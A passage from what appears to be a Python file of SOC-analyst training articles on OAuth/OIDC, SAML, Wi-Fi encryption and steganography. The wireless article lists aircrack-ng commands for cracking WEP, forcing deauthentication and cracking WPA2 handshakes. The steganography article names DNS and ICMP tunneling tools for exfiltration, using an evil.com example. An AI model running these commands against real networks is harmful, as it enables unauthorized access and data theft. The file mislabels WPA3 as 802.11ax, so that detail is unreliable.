| Replay protection| Yes (timestamps)           | Limited                     |
| Network required | DC must be reachable       | Works with IP addresses     |
| Protocol support | HTTP, SMB, LDAP, SQL       | Falls back when Kerberos fails|

## Key Takeaways

1. Kerberos is ticket-based: steal the ticket, access the service
2. The krbtgt account is the most critical secret in Active Directory
3. Kerberoasting exploits weak service account passwords - use gMSA
4. Disable RC4 encryption and enforce AES across the domain
5. Monitor Event IDs 4768, 4769, 4771 for attack indicators
6. Reset krbtgt password twice after any suspected compromise
"""
    ))

    # --------------------------------------------------------------------------
    # Article 11: OAuth 2.0 and OpenID Connect
    # --------------------------------------------------------------------------
    articles.append((
        "OAuth 2.0 and OpenID Connect",
        ["cryptography", "oauth", "openid-connect", "authentication", "authorization", "tokens", "identity"],
        r"""# OAuth 2.0 and OpenID Connect

## Overview

OAuth 2.0 is an **authorization** framework that allows applications to access resources
on behalf of a user without receiving the user's password. OpenID Connect (OIDC) adds an
**authentication** layer on top of OAuth 2.0.

## Authorization vs Authentication

| Concept         | Question Answered         | Protocol     | Token          |
|----------------|---------------------------|-------------|----------------|
| Authentication | Who are you?              | OIDC        | ID Token (JWT) |
| Authorization  | What can you access?      | OAuth 2.0   | Access Token   |

```
Example:
- OAuth 2.0: "Allow this app to read my Google Calendar" (authorization)
- OIDC: "Prove that this user is john@example.com" (authentication)
```

## OAuth 2.0 Roles

| Role                   | Description                                |
|-----------------------|--------------------------------------------|
| Resource Owner        | The user who owns the data                  |
| Client                | Application requesting access               |
| Authorization Server  | Issues tokens (e.g., Google, Okta, Azure AD)|
| Resource Server       | API that holds the protected data           |

## OAuth 2.0 Flows

### Authorization Code Flow (Most Common, Most Secure)

Used by server-side web applications.

```
1. User clicks "Login with Google"
2. App redirects to Authorization Server:
   GET /authorize?response_type=code&client_id=APP_ID&redirect_uri=https://app.com/callback&scope=profile email&state=RANDOM

3. User authenticates and consents
4. Auth server redirects back with authorization code:
   GET /callback?code=AUTH_CODE&state=RANDOM

5. App exchanges code for tokens (server-to-server):
   POST /token
   grant_type=authorization_code
   code=AUTH_CODE
   client_id=APP_ID
   client_secret=APP_SECRET
   redirect_uri=https://app.com/callback

6. Auth server returns:
   {
     "access_token": "eyJhbGci...",
     "token_type": "Bearer",
     "expires_in": 3600,
     "refresh_token": "dGhpcyBpcyBh...",
     "id_token": "eyJhbGci..."       (if OIDC)
   }
```

### Authorization Code + PKCE (Public Clients)

For mobile and SPA apps that cannot securely store a client_secret.

```
1. Client generates code_verifier (random string) and code_challenge = SHA256(code_verifier)
2. Authorization request includes code_challenge
3. Token request includes code_verifier (proves same client)
4. Server verifies SHA256(code_verifier) matches stored code_challenge
```

### Client Credentials Flow (Machine-to-Machine)

No user involved. Service authenticates as itself.

```
POST /token
grant_type=client_credentials
client_id=SERVICE_ID
client_secret=SERVICE_SECRET
scope=api.read

Response:
{
  "access_token": "eyJhbGci...",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

### Device Authorization Flow

For devices with limited input (smart TV, IoT).

```
1. Device requests device code:
   POST /device/code
   client_id=DEVICE_APP_ID
   scope=profile

2. Server returns:
   {
     "device_code": "GmRhmhcxhwAzkoEqiMEg",
     "user_code": "WDJB-MJHT",
     "verification_uri": "https://auth.example.com/device"
   }

3. Device shows: "Go to https://auth.example.com/device and enter code WDJB-MJHT"
4. User completes auth on phone/computer
5. Device polls for token until approved
```

### Implicit Flow (DEPRECATED)

Returns token directly in URL fragment. Vulnerable to token leakage.

```
# DO NOT USE for new applications
GET /authorize?response_type=token&client_id=APP_ID&redirect_uri=...
# Token returned in URL: /callback#access_token=TOKEN
# Anyone who sees the URL has the token
```

## Flow Selection Guide

| Application Type        | Recommended Flow               |
|------------------------|---------------------------------|
| Server-side web app    | Authorization Code              |
| SPA (React, Angular)   | Authorization Code + PKCE       |
| Mobile app             | Authorization Code + PKCE       |
| Machine-to-machine     | Client Credentials              |
| Smart TV / IoT         | Device Authorization            |
| Legacy only            | Implicit (deprecated)           |

## OpenID Connect (OIDC)

OIDC adds identity verification to OAuth 2.0 through the **ID Token**.

### ID Token (JWT)

```json
{
  "iss": "https://accounts.google.com",
  "sub": "110169484474386276334",
  "aud": "APP_CLIENT_ID",
  "exp": 1709251200,
  "iat": 1709247600,
  "nonce": "abc123",
  "email": "user@example.com",
  "name": "John Doe",
  "picture": "https://photo.url/photo.jpg"
}
```

### OIDC Scopes

| Scope     | Claims Returned                              |
|-----------|----------------------------------------------|
| openid    | sub (required for OIDC)                      |
| profile   | name, family_name, given_name, picture, etc. |
| email     | email, email_verified                        |
| address   | address                                      |
| phone     | phone_number, phone_number_verified          |

### OIDC Discovery

```bash
# Every OIDC provider publishes configuration at:
curl https://accounts.google.com/.well-known/openid-configuration | python3 -m json.tool

# Returns endpoints:
# - authorization_endpoint
# - token_endpoint
# - userinfo_endpoint
# - jwks_uri (public keys for verifying tokens)
```

## Token Security

### Access Token Best Practices

| Practice                    | Recommendation                          |
|----------------------------|-----------------------------------------|
| Token lifetime             | Short (5-60 minutes)                    |
| Refresh token lifetime     | Hours to days, with rotation            |
| Storage (browser)          | HttpOnly, Secure, SameSite cookie       |
| Storage (mobile)           | Secure enclave / keychain               |
| Transmission               | HTTPS only, Authorization header        |
| Validation                 | Verify signature, issuer, audience, exp |

### JWT Validation Checklist

```python
# Pseudo-code for JWT validation
def validate_jwt(token, expected_audience, jwks_url):
    header = decode_header(token)
    payload = decode_payload(token)

    # 1. Verify signature using public key from JWKS
    public_key = fetch_key(jwks_url, header['kid'])
    verify_signature(token, public_key, header['alg'])

    # 2. Check standard claims
    assert payload['iss'] == 'https://expected-issuer.com'  # Issuer
    assert payload['aud'] == expected_audience                # Audience
    assert payload['exp'] > current_time()                    # Not expired
    assert payload['iat'] <= current_time()                   # Issued in past
    assert payload['nbf'] <= current_time()                   # Not before

    # 3. Check nonce (if using OIDC)
    assert payload['nonce'] == stored_nonce
```

## Security Considerations

| Vulnerability              | Description                           | Mitigation                    |
|---------------------------|---------------------------------------|-------------------------------|
| Token theft               | Stolen access token = unauthorized access | Short expiry, token binding |
| CSRF                      | Forged authorization requests         | Use state parameter           |
| Authorization code interception | Code stolen from redirect      | Use PKCE                      |
| Open redirect             | Redirect to attacker site             | Validate redirect_uri strictly|
| Token replay              | Reuse of stolen token                 | Token binding, short expiry   |
| JWT algorithm confusion   | Attacker changes alg to "none"        | Whitelist allowed algorithms  |
| Refresh token theft       | Long-lived token stolen               | Rotation, binding, revocation |

## SOC Analyst OAuth/OIDC Investigation

```bash
# Decode a JWT token (without verification, for inspection)
echo "eyJhbGci..." | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Check token at jwt.io (DO NOT paste production tokens on public sites)
# Use local tools for sensitive tokens:
python3 -c "
import json, base64, sys
token = sys.argv[1]
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
" "YOUR_TOKEN_HERE"
```

## Key Takeaways

1. OAuth 2.0 is for authorization; OIDC adds authentication on top
2. Authorization Code + PKCE is recommended for all new applications
3. The Implicit flow is deprecated due to token leakage risks
4. Access tokens should be short-lived; use refresh tokens for longevity
5. Always validate JWT signature, issuer, audience, and expiration
6. Use the state parameter to prevent CSRF attacks
"""
    ))

    # --------------------------------------------------------------------------
    # Article 12: SAML and Federated Identity
    # --------------------------------------------------------------------------
    articles.append((
        "SAML and Federated Identity",
        ["cryptography", "saml", "sso", "federation", "identity", "authentication", "idp"],
        r"""# SAML and Federated Identity

## Overview

Security Assertion Markup Language (SAML) 2.0 is an XML-based standard for exchanging
authentication and authorization data between an Identity Provider (IdP) and a Service
Provider (SP). It enables Single Sign-On (SSO) across organizational boundaries.

## Core Concepts

| Term                     | Description                                    |
|-------------------------|------------------------------------------------|
| Identity Provider (IdP) | Authenticates users (e.g., Okta, Azure AD, ADFS)|
| Service Provider (SP)   | Application relying on IdP (e.g., Salesforce)  |
| SAML Assertion          | XML document with authentication/authorization data |
| SSO                     | Single Sign-On - one login for multiple apps   |
| SLO                     | Single Logout - one logout for all apps        |
| Metadata                | XML describing IdP/SP endpoints and certificates|
| Binding                 | Transport method (HTTP-POST, HTTP-Redirect)    |
| Relay State             | URL to redirect user after authentication      |

## SAML Assertion Structure

```xml
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_abc123" IssueInstant="2026-02-27T10:00:00Z" Version="2.0">

    <saml:Issuer>https://idp.example.com</saml:Issuer>

    <ds:Signature>...</ds:Signature>

    <saml:Subject>
        <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
            user@example.com
        </saml:NameID>
        <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:SubjectConfirmationData
                InResponseTo="_request123"
                Recipient="https://sp.example.com/sso/saml"
                NotOnOrAfter="2026-02-27T10:05:00Z"/>
        </saml:SubjectConfirmation>
    </saml:Subject>

    <saml:Conditions NotBefore="2026-02-27T09:59:00Z" NotOnOrAfter="2026-02-27T10:05:00Z">
        <saml:AudienceRestriction>
            <saml:Audience>https://sp.example.com</saml:Audience>
        </saml:AudienceRestriction>
    </saml:Conditions>

    <saml:AuthnStatement AuthnInstant="2026-02-27T10:00:00Z">
        <saml:AuthnContext>
            <saml:AuthnContextClassRef>
                urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
            </saml:AuthnContextClassRef>
        </saml:AuthnContext>
    </saml:AuthnStatement>

    <saml:AttributeStatement>
        <saml:Attribute Name="email">
            <saml:AttributeValue>user@example.com</saml:AttributeValue>
        </saml:Attribute>
        <saml:Attribute Name="role">
            <saml:AttributeValue>admin</saml:AttributeValue>
        </saml:Attribute>
    </saml:AttributeStatement>
</saml:Assertion>
```

## SP-Initiated SSO Flow (Most Common)

```
User            Service Provider (SP)         Identity Provider (IdP)
  |                    |                              |
  |--- Access app ---->|                              |
  |                    |                              |
  |                    |-- SAML AuthnRequest -------->|
  |                    |   (HTTP-Redirect or POST)    |
  |                    |                              |
  |<--- Login page ----|------- Redirect -------------|
  |                    |                              |
  |--- Credentials ----|-------------------------->---|
  |                    |                              |
  |<--- SAML Response--|<-- (HTTP-POST with assertion)|
  |    (via browser)   |                              |
  |                    |                              |
  |                    |-- Validate assertion -------->|
  |                    |-- Create local session -------|
  |                    |                              |
  |<--- Access granted-|                              |
```

## IdP-Initiated SSO Flow

```
User starts at IdP portal (e.g., Okta dashboard), clicks app icon.
IdP generates SAML Response directly without an AuthnRequest.
Less secure because there is no request ID to match against.
```

## SAML vs OAuth 2.0 vs OIDC

| Feature           | SAML 2.0               | OAuth 2.0              | OIDC                  |
|-------------------|------------------------|------------------------|-----------------------|
| Primary purpose   | SSO / Authentication   | Authorization          | Authentication        |
| Token format      | XML Assertion          | Opaque or JWT          | JWT (ID Token)        |
| Transport         | HTTP-POST, Redirect    | HTTP                   | HTTP                  |
| Best for          | Enterprise SSO         | API authorization      | Modern SSO + API      |
| Mobile support    | Poor                   | Good                   | Good                  |
| Complexity        | High (XML, signatures) | Medium                 | Medium                |
| Year introduced   | 2005                   | 2012                   | 2014                  |
| Data format       | XML                    | JSON                   | JSON                  |

### When to Use What

| Scenario                         | Recommended Protocol  |
|----------------------------------|-----------------------|
| Enterprise web SSO               | SAML or OIDC          |
| Mobile app authentication        | OIDC                  |
| API authorization                | OAuth 2.0             |
| Third-party SaaS integration     | SAML (most support it)|
| Modern greenfield application    | OIDC                  |
| B2B federation                   | SAML                  |

## Federation Trust

Federation allows organizations to trust each other's identity systems.

```
Organization A (IdP)  <---trust--->  Organization B (SP)

Setup:
1. Exchange SAML metadata (endpoints, certificates)
2. Configure attribute mapping (names, roles)
3. Set up certificate for signing assertions
4. Test with pilot users
5. Roll out
```

### Metadata Exchange

```bash
# IdP publishes metadata at:
https://idp.example.com/saml/metadata

# SP publishes metadata at:
https://app.example.com/saml/metadata

# Download and inspect metadata
curl -o idp_metadata.xml https://idp.example.com/saml/metadata
xmllint --format idp_metadata.xml
```

## Common SAML Attacks

| Attack                    | Description                                | Mitigation                      |
|--------------------------|--------------------------------------------|---------------------------------|
| XML Signature Wrapping   | Move signed element, inject malicious one  | Strict schema validation        |
| Assertion replay         | Reuse captured SAML response               | Check InResponseTo, timestamps  |
| Certificate spoofing     | Use attacker cert to sign assertions       | Pin IdP certificate             |
| XXE (XML External Entity)| Parse malicious XML entities               | Disable external entity parsing |
| CSRF on ACS endpoint     | Forge POST to Assertion Consumer Service   | Validate InResponseTo           |
| IdP confusion            | Trick SP into accepting wrong IdP          | Validate Issuer strictly        |
| Assertion injection      | Add unauthorized attributes                | Strict attribute validation     |

### XML Signature Wrapping Example

```xml
<!-- Attacker wraps the signed assertion and injects a new unsigned one -->
<samlp:Response>
    <saml:Assertion ID="evil">   <!-- Unsigned, attacker-controlled -->
        <saml:Subject>admin@example.com</saml:Subject>
    </saml:Assertion>
    <saml:Assertion ID="legit">  <!-- Original signed assertion -->
        <saml:Subject>user@example.com</saml:Subject>
        <ds:Signature>...</ds:Signature>
    </saml:Assertion>
</samlp:Response>
<!-- If SP checks signature on "legit" but reads subject from "evil", attack succeeds -->
```

## Security Best Practices

```
SAML Hardening Checklist:
[ ] Require signed SAML Assertions (not just signed Response)
[ ] Validate assertion signature before reading any claims
[ ] Check InResponseTo matches the original AuthnRequest ID
[ ] Enforce NotBefore and NotOnOrAfter timestamps (tight window)
[ ] Validate AudienceRestriction matches your SP entity ID
[ ] Validate Issuer matches expected IdP
[ ] Use HTTPS for all SAML endpoints
[ ] Disable XML external entity processing
[ ] Reject assertions with no signature
[ ] Implement replay detection (track assertion IDs)
[ ] Rotate signing certificates before expiration
[ ] Log all SAML authentication events
```

## SOC Analyst Investigation

```bash
# Decode a SAML Response (Base64 encoded in HTTP POST)
echo "PHNhbWxwOlJlc..." | base64 -d | xmllint --format -

# Check SAML Response in browser DevTools:
# Network tab > POST to /sso/saml > Form Data > SAMLResponse

# Python decode
python3 -c "
import base64, sys
from xml.dom.minidom import parseString
saml = base64.b64decode(sys.argv[1])
print(parseString(saml).toprettyxml())
" "BASE64_SAML_RESPONSE"

# Validate SAML signature with xmlsec1
xmlsec1 --verify --pubkey-cert-pem idp_cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:assertion:Assertion response.xml
```

## Key Takeaways

1. SAML is the dominant protocol for enterprise SSO and B2B federation
2. XML Signature Wrapping is the most common SAML attack vector
3. Always validate signatures BEFORE reading assertion content
4. OIDC is replacing SAML for new applications (simpler, mobile-friendly)
5. Strict timestamp validation prevents replay attacks
6. Monitor SAML authentication logs for anomalous patterns
"""
    ))

    # --------------------------------------------------------------------------
    # Article 13: Wireless Encryption WEP WPA WPA2 WPA3
    # --------------------------------------------------------------------------
    articles.append((
        "Wireless Encryption WEP WPA WPA2 WPA3",
        ["cryptography", "wireless", "wifi", "wep", "wpa", "wpa2", "wpa3", "802.1x"],
        r"""# Wireless Encryption: WEP, WPA, WPA2, WPA3

## Overview

Wireless networks transmit data over radio waves, making encryption essential. The
evolution from WEP to WPA3 reflects decades of cryptographic lessons learned. SOC
analysts must understand each standard to assess wireless security posture and
investigate wireless attacks.

## Evolution Timeline

| Standard | Year | Encryption      | Key Mgmt      | Status      |
|----------|------|-----------------|---------------|-------------|
| WEP      | 1997 | RC4 (40/104-bit)| Static keys   | BROKEN      |
| WPA      | 2003 | RC4-TKIP        | PSK / 802.1X  | DEPRECATED  |
| WPA2     | 2004 | AES-CCMP        | PSK / 802.1X  | CURRENT     |
| WPA3     | 2018 | AES-CCMP/GCMP   | SAE / 802.1X  | RECOMMENDED |

## WEP (Wired Equivalent Privacy) - BROKEN

WEP uses RC4 stream cipher with a 24-bit Initialization Vector (IV).

### Why WEP is Broken

```
Problems:
1. 24-bit IV = only 16 million combinations -> IV reuse inevitable
2. IV sent in plaintext -> attacker can correlate IVs
3. No per-packet key mixing -> same key encrypts all traffic
4. CRC-32 integrity (not cryptographic) -> packet injection possible
5. Static keys -> never change unless manually rotated
```

```bash
# WEP can be cracked in minutes with aircrack-ng:
# 1. Put adapter in monitor mode
airmon-ng start wlan0

# 2. Capture packets
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# 3. Inject traffic to speed up IV collection
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# 4. Crack the key (needs ~40,000 IVs)
aircrack-ng capture*.cap
```

**SOC Action**: If WEP is detected on your network, it must be replaced immediately.
There is no way to make WEP secure.

## WPA (Wi-Fi Protected Access) - DEPRECATED

WPA was a stopgap measure using existing hardware. It introduced TKIP (Temporal Key
Integrity Protocol) which adds per-packet key mixing to RC4.

### TKIP Improvements Over WEP

| Feature           | WEP              | WPA/TKIP            |
|-------------------|-------------------|---------------------|
| Cipher            | RC4               | RC4 (with TKIP)     |
| IV size           | 24-bit            | 48-bit              |
| Key mixing        | None              | Per-packet           |
| Integrity         | CRC-32            | MIC (Michael)       |
| Key management    | Static            | Dynamic (4-way)     |
| Replay protection | None              | Sequence counter     |

WPA/TKIP has known vulnerabilities (Beck-Tews, Ohigashi-Morii) and is deprecated.

## WPA2 (IEEE 802.11i) - CURRENT STANDARD

WPA2 uses AES-CCMP (Counter Mode with CBC-MAC Protocol) providing strong encryption
and integrity.

### WPA2 Modes

| Mode            | Authentication         | Use Case               |
|-----------------|------------------------|------------------------|
| WPA2-Personal   | Pre-Shared Key (PSK)   | Home, small office     |
| WPA2-Enterprise | 802.1X / RADIUS        | Corporate networks     |

### WPA2 Four-Way Handshake

```
Client (Supplicant)                    Access Point (Authenticator)
    |                                        |
    |<--- Message 1: ANonce ------------------|
    |     (AP sends random nonce)             |
    |                                        |
    |--- Message 2: SNonce, MIC ------------>|
    |    (Client sends nonce + proof)        |
    |                                        |
    |    Both sides now compute PTK:         |
    |    PTK = PRF(PMK, ANonce, SNonce,      |
    |              AP_MAC, Client_MAC)       |
    |                                        |
    |<--- Message 3: GTK (encrypted), MIC ---|
    |     (AP sends group key)               |
    |                                        |
    |--- Message 4: ACK, MIC -------------->|
    |                                        |
    |<======= Encrypted traffic ============>|
```

### WPA2-PSK Cracking

```bash
# Capture the 4-way handshake
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon

# Deauthenticate a client to force reconnection
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Crack with dictionary attack
aircrack-ng -w wordlist.txt capture*.cap

# Crack with hashcat (much faster with GPU)
hcxpcapngtool -o hash.22000 capture.pcapng
hashcat -m 22000 hash.22000 wordlist.txt
```

### KRACK Attack (2017)

Key Reinstallation Attack forces nonce reuse in the four-way handshake.

```
Impact: Decrypt packets, inject traffic
Affected: All WPA2 implementations (before patches)
Mitigation: Patch clients and APs, use HTTPS for sensitive traffic
```

## WPA3 (IEEE 802.11ax Security) - RECOMMENDED

### WPA3 Improvements

| Feature                    | WPA2                  | WPA3                    |
|---------------------------|-----------------------|-------------------------|
| Key exchange              | PSK (4-way handshake) | SAE (Dragonfly)         |
| Forward secrecy           | No                    | Yes                     |
| Offline dictionary attack | Possible              | Not possible            |
| Open network encryption   | None                  | OWE (Opportunistic)     |
| Management frame protection| Optional (802.11w)   | Mandatory               |
| Minimum encryption        | AES-CCMP 128          | AES-CCMP 128 / GCMP 256|

### SAE (Simultaneous Authentication of Equals)

SAE replaces the PSK handshake with a zero-knowledge proof protocol (Dragonfly).

```
Key properties of SAE:
1. Password is never transmitted (not even as a hash)
2. Each session has unique encryption keys (forward secrecy)
3. Offline dictionary attacks are not possible
4. Brute force requires online interaction (rate-limited)
```

### WPA3 Transition Mode

```
Configuration for mixed environments:
- WPA3-SAE for capable clients
- WPA2-PSK fallback for legacy clients
- Separate SSIDs recommended for WPA2 and WPA3

Note: Transition mode may be vulnerable to downgrade attacks
where attacker forces WPA2 connection
```

## 802.1X Enterprise Mode

### Components

```
Supplicant          Authenticator          RADIUS Server
(Client)            (AP/Switch)            (FreeRADIUS, NPS, ISE)
    |                    |                       |
    |--- EAP Start ----->|                       |
    |                    |--- Access-Request ---->|
    |<-- EAP Challenge --|<-- Access-Challenge ---|
    |--- EAP Response -->|--- Access-Request ---->|
    |                    |                       |
    |    (multiple EAP rounds)                   |
    |                    |                       |
    |<-- EAP Success ----|<-- Access-Accept ------|
    |    + Session Key   |   + VLAN assignment   |
```

### EAP Methods

| Method        | Certificate Required | Security Level | Notes                  |
|--------------|---------------------|---------------|------------------------|
| EAP-TLS      | Client + Server     | Highest       | Mutual certificate auth|
| PEAP         | Server only         | High          | Password in TLS tunnel |
| EAP-TTLS     | Server only         | High          | Similar to PEAP        |
| EAP-FAST     | Optional            | High          | Cisco proprietary      |
| EAP-MD5      | None                | LOW           | Do not use             |
| LEAP         | None                | BROKEN        | Cisco legacy, cracked  |

### RADIUS Configuration Example

```
# FreeRADIUS client configuration (/etc/freeradius/clients.conf)
client wireless_ap {
    ipaddr = 10.0.1.10
    secret = RadiusSharedSecret123!
    nastype = other
}

# User configuration (/etc/freeradius/users)
"john" Cleartext-Password := "UserPassword123"
    Tunnel-Type = VLAN,
    Tunnel-Medium-Type = IEEE-802,
    Tunnel-Private-Group-Id = 100
```

## Wireless Security Assessment

```bash
# Scan for wireless networks and their encryption
iwlist wlan0 scan | grep -E "ESSID|Encryption|IE:"

# Using nmcli
nmcli dev wifi list

# Check your current connection encryption
iwconfig wlan0

# Monitor for rogue APs
airodump-ng wlan0mon --manufacturer --uptime

# Check for WPS (vulnerable to brute force)
wash -i wlan0mon
```

## Wireless Security Hardening

| Setting                     | Recommendation                        |
|----------------------------|---------------------------------------|
| Encryption                 | WPA3-SAE or WPA2-AES (CCMP)         |
| SSID broadcast             | Hiding provides no real security      |
| MAC filtering              | Easily bypassed, not a security control|
| Management frame protection| Enable (802.11w / PMF)               |
| WPS                        | Disable (vulnerable to brute force)  |
| Enterprise mode            | Use 802.1X with EAP-TLS where possible|
| Guest network              | Separate VLAN, isolated from corporate|
| AP firmware                | Keep updated                          |
| PSK complexity             | 20+ characters if using WPA2-PSK     |

## Key Takeaways

1. WEP and WPA/TKIP must never be used - they are broken
2. WPA2-AES is the minimum acceptable standard
3. WPA3-SAE provides forward secrecy and resists offline attacks
4. Enterprise environments should use 802.1X with EAP-TLS
5. WPS should always be disabled
6. Long, complex passphrases are critical for WPA2-PSK security
"""
    ))

    # --------------------------------------------------------------------------
    # Article 14: Steganography and Data Hiding Techniques
    # --------------------------------------------------------------------------
    articles.append((
        "Steganography and Data Hiding Techniques",
        ["cryptography", "steganography", "data-hiding", "forensics", "steganalysis", "covert-channels"],
        r"""# Steganography and Data Hiding Techniques

## Overview

Steganography is the practice of hiding secret data within ordinary, non-secret data
or media. Unlike encryption (which makes data unreadable), steganography hides the
very existence of the secret message. Attackers use steganography for data exfiltration,
C2 communication, and hiding malware payloads.

## Steganography vs Encryption vs Obfuscation

| Technique       | Hides Content | Hides Existence | Reversible |
|-----------------|---------------|-----------------|------------|
| Encryption      | Yes           | No              | Yes (key)  |
| Steganography   | Yes           | Yes             | Yes (key)  |
| Obfuscation     | Partially     | No              | Usually    |
| Steg + Encrypt  | Yes           | Yes             | Yes (key)  |

Best practice for covert communication: encrypt first, then embed via steganography.

## Image Steganography

### Least Significant Bit (LSB) Insertion

The most common technique. Modifies the least significant bits of pixel values.

```
Original pixel (RGB): (148, 203, 55)
Binary:               10010100  11001011  00110111

Embedding 3 bits (1, 0, 1):
Modified pixel:       10010101  11001010  00110111
                              ^         ^         ^
Decimal:              (149, 202, 55)

Human eye cannot distinguish between (148,203,55) and (149,202,55)
```

### Capacity

```
Image: 1920 x 1080 pixels, 3 channels (RGB), 1 bit per channel
Capacity = 1920 * 1080 * 3 * 1 / 8 = 777,600 bytes = ~760 KB

With 2 bits per channel:
Capacity = 1920 * 1080 * 3 * 2 / 8 = 1,555,200 bytes = ~1.5 MB
```

### Image Steganography Tools

```bash
# steghide - hide data in JPEG/BMP/WAV/AU files
# Embed secret file in image
steghide embed -cf cover.jpg -ef secret.txt -p "passphrase"

# Extract hidden data
steghide extract -sf cover.jpg -p "passphrase"

# Get info about embedded data
steghide info cover.jpg

# OpenStego - GUI tool for PNG images
# java -jar OpenStego.jar

# LSB-Steg (Python)
python3 lsb_steg.py encode -i cover.png -o stego.png -f secret.txt
python3 lsb_steg.py decode -i stego.png -o extracted.txt
```

### Image Format Considerations

| Format | Steg-Friendly | Notes                                     |
|--------|--------------|-------------------------------------------|
| PNG    | Excellent    | Lossless, preserves exact pixel values     |
| BMP    | Excellent    | Uncompressed, easy to manipulate           |
| JPEG   | Moderate     | Lossy compression may destroy hidden data  |
| GIF    | Limited      | Palette-based, limited color space         |
| TIFF   | Good         | Lossless, supports multiple layers         |

## Audio Steganography

```bash
# Hide data in WAV files using steghide
steghide embed -cf audio.wav -ef secret.txt -p "passphrase"

# LSB in audio samples (similar concept to images)
# Each 16-bit audio sample can hide 1-2 bits
# CD quality: 44100 samples/sec * 2 channels * 1 bit = 11 KB/sec capacity

# Frequency domain hiding (spread spectrum)
# Hides data in frequencies humans cannot easily hear
# More robust against compression
```

## Network Steganography

### DNS Tunneling

```bash
# Data hidden in DNS queries
# Query: encoded-data.evil.com
# Response: TXT record with encoded response

# Tools: iodine, dnscat2, dns2tcp

# Detection: Monitor for
# - Unusually long DNS queries
# - High volume of TXT record lookups
# - DNS queries to unusual domains
# - Encoded-looking subdomain labels
```

### HTTP Steganography

```
Hiding data in HTTP headers:
X-Custom-Header: SGVsbG8gV29ybGQ=     (Base64 encoded "Hello World")

Hiding data in HTML:
<!-- Data hidden in HTML comments -->
<span style="font-size:0px">hidden text here</span>

Hiding in image requests:
GET /images/logo.png?data=encoded_payload HTTP/1.1

Hiding in response timing:
Varying response times to encode binary data (covert timing channel)
```

### ICMP Steganography

```bash
# Hide data in ICMP ping packets (payload field)
# Tool: ptunnel, icmpsh

# Detection: Monitor for
# - ICMP packets with unusual payload sizes
# - High volume of ICMP traffic
# - ICMP packets to external addresses

# Example: ping with custom data
ping -p "48656c6c6f" -c 1 target.com  # "Hello" in hex
```

### TCP/IP Header Manipulation

```
Fields that can hide data:
- IP identification field (16 bits)
- TCP sequence numbers (32 bits)
- TCP urgent pointer (16 bits)
- IP options field (variable)
- TCP timestamp options (64 bits)

Tool: covert_tcp (proof of concept)
```

## Detection Techniques (Steganalysis)

### Visual Analysis

```bash
# Compare original and suspicious images
compare original.png suspicious.png diff.png

# Extract and visualize LSB plane
python3 -c "
from PIL import Image
import numpy as np
img = np.array(Image.open('suspicious.png'))
lsb = (img & 1) * 255  # Extract LSB, amplify
Image.fromarray(lsb.astype(np.uint8)).save('lsb_plane.png')
"

# zsteg - detect LSB steganography in PNG/BMP
zsteg suspicious.png
zsteg -a suspicious.png  # Try all methods

# Detect steghide
stegdetect suspicious.jpg
```

### Statistical Analysis

```bash
# Chi-square analysis (detects LSB embedding)
# Embedded images have different statistical properties than natural images

# Histogram analysis
python3 -c "
from PIL import Image
import collections
img = Image.open('suspicious.png')
pixels = list(img.getdata())
r_hist = collections.Counter(p[0] for p in pixels)
# Natural images: smooth histogram
# LSB steg: pairs of values (2n, 2n+1) have similar counts
for i in range(0, 256, 2):
    diff = abs(r_hist.get(i, 0) - r_hist.get(i+1, 0))
    if diff < 5:
        print(f'Suspicious pair: {i},{i+1} counts: {r_hist.get(i,0)},{r_hist.get(i+1,0)}')
"

# RS analysis (Regular/Singular groups)
# Detects percentage of embedding
# High capacity embedding is easier to detect
```

### File Structure Analysis

```bash
# Check for appended data after file end marker
xxd suspicious.jpg | tail -20
# JPEG ends with FF D9 - anything after is suspicious

# Check file size vs expected size
identify -verbose suspicious.png | grep -E "Filesize|Geometry"

# binwalk - find embedded files
binwalk suspicious.png
binwalk -e suspicious.png  # Extract embedded files

# foremost - carve files from binary data
foremost -i suspicious.png -o output/

# strings - look for hidden text
strings suspicious.png | head -50
```

## Forensic Investigation Workflow

```
Steganography Investigation:
1. Identify suspicious files (unusual sizes, metadata anomalies)
2. Run automated detection tools:
   - zsteg (PNG/BMP)
   - stegdetect (JPEG)
   - binwalk (any file)
   - strings (any file)
3. Visual inspection (LSB planes, histogram analysis)
4. Statistical analysis (chi-square, RS analysis)
5. Check for known steg tool signatures
6. Compare with original if available
7. Try common passwords with steghide/OpenStego
8. Document findings for evidence chain
```

## Real-World Attack Scenarios

| Scenario                  | Technique                    | Detection                    |
|--------------------------|------------------------------|------------------------------|
| Data exfiltration        | Hide stolen data in images uploaded to social media | Monitor for unusual image uploads |
| C2 communication         | Commands hidden in images on compromised websites | Analyze downloaded images |
| Malware delivery         | Payload hidden in image, extracted by dropper | Behavioral analysis, sandboxing |
| Covert messaging         | Messages in shared documents | Metadata analysis |
| Watermarking (defensive) | Track document leaks         | Invisible markers in documents |

## Key Takeaways

1. Steganography hides the existence of data, not just its content
2. LSB insertion in images is the most common technique
3. Network steganography (DNS tunneling, ICMP) is used for C2 and exfiltration
4. Detection requires statistical analysis, not just visual inspection
5. Tools like zsteg, binwalk, and stegdetect automate initial detection
6. Combine encryption with steganography for maximum covertness
"""
    ))

    # --------------------------------------------------------------------------
    # Article 15: Cryptographic Attacks and Weaknesses
    # --------------------------------------------------------------------------
    articles.append((
        "Cryptographic Attacks and Weaknesses",
        ["cryptography", "attacks", "vulnerabilities", "birthday-attack", "side-channel", "quantum-computing"],
        r"""# Cryptographic Attacks and Weaknesses

## Overview

Understanding cryptographic attacks is essential for SOC analysts to assess risk,
evaluate vulnerability reports, and recommend mitigations. This article covers
the major categories of attacks against cryptographic systems.

